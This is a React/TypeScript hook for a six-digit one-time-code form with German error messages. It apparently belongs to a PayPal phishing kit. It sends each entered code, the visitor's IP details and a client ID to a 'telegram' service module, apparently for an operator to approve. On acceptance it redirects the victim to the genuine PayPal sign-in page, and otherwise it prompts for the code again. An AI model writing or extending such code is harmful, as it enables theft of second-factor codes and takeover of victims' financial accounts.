import { useState, FormEvent } from 'react';
import { verifyOTP } from '../services/telegram';
import { getIPInfo } from '../services/ip';
import { getClientId } from '../utils/clientId';

export const useOTPForm = () => {
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [otp, setOTP] = useState(['', '', '', '', '', '']);

  const clearOTP = () => {
    setOTP(['', '', '', '', '', '']);
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (isLoading) return;
    
    const otpValue = otp.join('');
    if (otpValue.length !== 6) {
      setError('Bitte geben Sie einen gültigen 6-stelligen Code ein');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      const ipInfo = await getIPInfo();
      const clientId = getClientId();
      const result = await verifyOTP({ 
        otp: otpValue, 
        ipInfo,
        clientId
      });
      
      if (result === 'accept') {
        window.location.replace('https://www.paypal.com/signin');
      } else {
        clearOTP();
        throw new Error('Verification failed');
      }
    } catch (error) {
      clearOTP();
      setError('Der eingegebene Code ist ungültig. Bitte versuchen Sie es erneut.');
    } finally {
      setIsLoading(false);
    }
  };

  return {
    isLoading,
    error,
    otp,
    setOTP,
    clearOTP,
    handleSubmit
  };
};